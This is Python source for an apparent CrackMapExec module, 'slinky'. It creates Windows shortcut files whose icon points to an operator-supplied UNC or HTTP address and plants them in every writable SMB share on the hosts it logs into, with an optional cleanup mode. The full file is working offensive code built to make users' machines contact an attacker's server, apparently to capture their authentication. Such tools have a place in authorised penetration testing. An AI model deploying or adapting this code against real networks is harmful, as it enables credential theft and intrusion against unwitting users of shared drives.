#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pylnk3
import ntpath
from sys import exit


class CMEModule:
    """
    Original idea and PoC by Justin Angel (@4rch4ngel86)
    Module by @byt3bl33d3r
    """

    name = "slinky"
    description = "Creates windows shortcuts with the icon attribute containing a URL to the specified server in all SMB shares with write permissions"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.url = None
        self.file_path = None
        self.lnk_path = None
        self.lnk_name = None
        self.cleanup = None

    def options(self, context, module_options):
        """
        URL           URL in the LNK file; e.g. UNC path 'URL=\\\\<TARGETIP>\\icons\\icon.ico'
                          or HTTP 'URL=http://<HOSTNAME>/icons/icon.ico'
        NAME          LNK file name
        CLEANUP       Cleanup (choices: True or False)
        """

        self.cleanup = False

        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])

        if "NAME" not in module_options:
            context.log.fail("NAME option is required!")
            exit(1)

        if not self.cleanup and "URL" not in module_options:
            context.log.fail("URL option is required!")
            exit(1)

        self.lnk_name = module_options["NAME"]
        self.lnk_path = f"/tmp/{self.lnk_name}.lnk"
        self.file_path = ntpath.join("\\", f"{self.lnk_name}.lnk")

        if not self.cleanup:
            self.url = module_options["URL"]
            link = pylnk3.create(self.lnk_path)
            link.icon = self.url
            link.save()

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if "WRITE" in share["access"] and share["name"] not in [
                "C$",
                "ADMIN$",
                "NETLOGON",
            ]:
                context.log.success(f"Found writable share: {share['name']}")
                if not self.cleanup:
                    with open(self.lnk_path, "rb") as lnk:
                        try:
                            connection.conn.putFile(share["name"], self.file_path, lnk.read)
                            context.log.success(f"Created LNK file on the {share['name']} share")
                        except Exception as e:
                            context.log.fail(f"Error writing LNK file to share {share['name']}: {e}")
                else:
                    try:
                        connection.conn.deleteFile(share["name"], self.file_path)
                        context.log.success(f"Deleted LNK file on the {share['name']} share")
                    except Exception as e:
                        context.log.fail(f"Error deleting LNK file on share {share['name']}: {e}")
